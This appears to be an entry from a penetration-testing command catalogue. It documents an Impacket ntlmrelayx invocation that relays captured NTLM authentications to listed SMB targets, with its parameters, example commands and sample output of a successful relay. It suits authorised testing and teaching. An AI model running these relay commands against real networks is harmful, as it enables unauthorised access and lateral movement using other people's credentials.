---
id: f3a68305-9209-474f-ab56-9bd046c2d79b
name: impacket-ntlmrelayx-smb-relay
type: command
executor: python
data: ntlmrelayx.py -tf $_TARGETS_FILE -smb2support --no-http-server
output: null
created_at: '2023-04-06T03:56:05.363536+00:00'
updated_at: '2023-04-10T20:26:21.879066+00:00'
platforms:
  - Linux
tags:
  - exploit
  - smb
  - relay
verified: true
validated: true
---

# impacket-ntlmrelayx-smb-relay

## Command

```python
ntlmrelayx.py -tf $_TARGETS_FILE -smb2support --no-http-server
```

## Description

This Impacket command runs ntlmrelayx to relay captured NTLM authentications to specified SMB targets. Used in conjunction with poisoning tools like Responder for MitM relay attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -tf $_TARGETS_FILE | File with target IPs/hosts | Yes |
| -smb2support | Enable SMBv2 protocol support | Yes |
| --no-http-server | Disable HTTP server (focus on SMB) | No |

## Examples

### Basic Relay

```python
ntlmrelayx.py -tf targets.txt -smb2support
```

### SMB-Only Relay

```python
ntlmrelayx.py -tf smb-targets.txt --no-http-server
```

## Expected Output

Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client ntlmrelayx loaded...
[*] SMB Relay enabled

[Relay-Client] Received NTLM auth from 192.168.1.50, relaying to 192.168.1.10
[*] SMB - Relay access to 192.168.1.10 successful!

Success shown by relayed access messages and potential shell prompts if -e option used.

## Related

- [[procedures/SMB-Relay-Attack-via-Disabled-SMB-Signing]]
